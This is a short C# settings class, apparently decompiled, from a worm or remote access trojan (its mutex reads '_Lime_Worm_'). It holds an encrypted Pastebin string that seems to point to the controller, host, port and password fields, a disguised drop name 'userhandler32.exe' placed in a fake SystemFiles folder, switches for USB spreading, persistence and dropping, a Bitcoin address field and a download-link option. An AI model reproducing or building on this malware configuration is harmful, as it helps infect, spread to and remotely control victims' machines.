using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Client_0._5;

public class C_Settings
{
	public static string Pastebin = "vFekW/XQ6fJkdzUhlSV2wmPobSFxG7LhtR3RC5X+MgnLOLKtPdKvo6J4cgHPw3KA";

	public static string HOST;

	public static int PORT;

	public static string PASS = "coolpass";

	public static string KEY = "|'N'|";

	public static string SPL = "|'L'|";

	public static string EXE = "userhandler32.exe";

	public static Mutex NMT = null;

	public static string MTX = "_Lime_Worm_";

	public static bool USB = Conversions.ToBoolean("True");

	public static bool PIN = Conversions.ToBoolean("True");

	public static bool ANTI = Conversions.ToBoolean("False");

	public static bool DROP = Conversions.ToBoolean("True");

	public static string PATH1 = "UserProfile";

	public static string PATH2 = "\\SystemFiles";

	public static object fullpath = Interaction.Environ(PATH1) + PATH2 + "\\" + EXE;

	public static string BTC_ADDR = "";

	public static bool DWN_CHK = Conversions.ToBoolean("False");

	public static string DWN_LINK = "";
}
